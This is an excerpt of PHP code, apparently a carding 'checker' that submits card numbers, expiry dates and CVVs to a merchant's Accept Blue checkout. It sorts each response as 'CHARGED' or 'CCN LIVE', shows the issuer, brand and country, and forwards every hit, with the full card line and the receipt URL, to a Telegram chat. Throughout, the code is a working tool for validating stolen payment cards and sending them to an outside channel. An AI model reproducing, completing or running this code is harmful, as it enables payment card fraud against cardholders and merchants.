...
$paymentMethods = [
    ...
    'acceptbluecard' => '/<input[^>]*name="payment_method"[^>]*value="acceptbluecard"/'
    ];
...
curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query([
    ...
    'acceptblue-cardnumber' => $cc,
    'acceptblue-expiry_m' => $mes,
    'acceptblue-expiry_y' => $ano,
    'acceptblue-card_cvc' =>  $cvv,
...
if ($isoCountry !== 'Not found') {
 ...
 if (strpos($Payment, '"result":"success","redirect"') !== false && strpos($Payment, 'order-received') !== false) { 
    ...
    <span style="color: #15b823ff; padding: 8px;"> INFO: '.$cardBrand.'-'.$cardtype.'-'.$cardlevel.' | '.$issuerName.' | '.$isoCountry.' <br><br>';
      ...
      $telegramMessage = "[#CHARGED]- $lista [CVV CHARGED ACCEPTBLUECARD]
    \n[$hostname1]
    \n[$receiptUrl]\n";
    sendToTelegram($telegramMessage, $telegramToken, $chatId);
    
} elseif (strpos($msg, 'Declined by Processor or Issuer - CVV2 Value supplied is invalid.') !== false || strpos($msg, 'Declined by Processor or Issuer - CVV2 Value supplied is invalid.') !== false) {
    ...
    <span style="color: #daff09ff; padding: 8px;"> INFO: '.$cardBrand.'-'.$cardtype.'-'.$cardlevel.' | '.$issuerName.' | '.$isoCountry.' <br><br>';
      ...
      $telegramMessage = "[#CCN]- $lista [CCN LIVE ACCEPTBLUECARD]
